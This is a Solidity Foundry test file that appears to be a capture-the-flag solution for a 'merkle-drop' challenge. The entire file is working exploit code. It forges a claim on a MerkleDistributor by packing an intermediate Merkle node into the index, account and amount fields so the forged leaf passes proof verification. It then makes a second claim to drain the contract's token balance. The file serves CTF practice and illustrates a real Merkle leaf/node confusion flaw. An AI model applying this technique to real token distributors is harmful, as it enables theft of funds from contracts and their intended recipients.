// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/console2.sol";
import "forge-std/Test.sol";
import {Setup, Token, MerkleDistributor} from "../src/merkle-drop/Setup.sol";

contract ExploitMerkleDrop is Test {
    Setup s;
    Token t;
    MerkleDistributor md;

    function setUp() public {
        s = new Setup();
        t = s.token();
        md = s.merkleDistributor();
    }

    function test__exploit() public {
        // Index 37 and 19 packing
        bytes32[] memory proof1 = new bytes32[](5);
        proof1[0] = bytes32(0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d); // 1st proof element for indexes 19 & 37
        proof1[1] = bytes32(0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde); // 2nd proof element for indexes 19 & 37
        proof1[2] = bytes32(0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813); // 3rd proof element for indexes 19 & 37
        proof1[3] = bytes32(0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c); // 4th proof element for indexes 19 & 37
        proof1[4] = bytes32(0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5); // 5th proof element for indexes 19 & 37

        uint256 index1 = 0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442; // 0th proof element for index 19
        address account1 = 0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A; // First 160 bits for 0th proof element of index 37
        uint96 amount1 = 0xf40f0c122ae08d2207b; // Last 96 bits for 0th proof element of index 37

        md.claim(index1, account1, amount1, proof1);

        console2.log("contract balance:", t.balanceOf(address(md)));

        // Normal claim for index 8
        bytes32[] memory proof2 = new bytes32[](6);

        proof2[0] = bytes32(0xe10102068cab128ad732ed1a8f53922f78f0acdca6aa82a072e02a77d343be00);
        proof2[1] = bytes32(0xd779d1890bba630ee282997e511c09575fae6af79d88ae89a7a850a3eb2876b3);
        proof2[2] = bytes32(0x46b46a28fab615ab202ace89e215576e28ed0ee55f5f6b5e36d7ce9b0d1feda2);
        proof2[3] = bytes32(0xabde46c0e277501c050793f072f0759904f6b2b8e94023efb7fc9112f366374a);
        proof2[4] = bytes32(0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c);
        proof2[5] = bytes32(0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5);

        uint256 index2 = 8;
        address account2 = 0x249934e4C5b838F920883a9f3ceC255C0aB3f827;
        uint96 amount2 = 0xa0d154c64a300ddf85;

        md.claim(index2, account2, amount2, proof2);

        console2.log("contract balance:", t.balanceOf(address(md)));

        assertTrue(s.isSolved());
    }
}
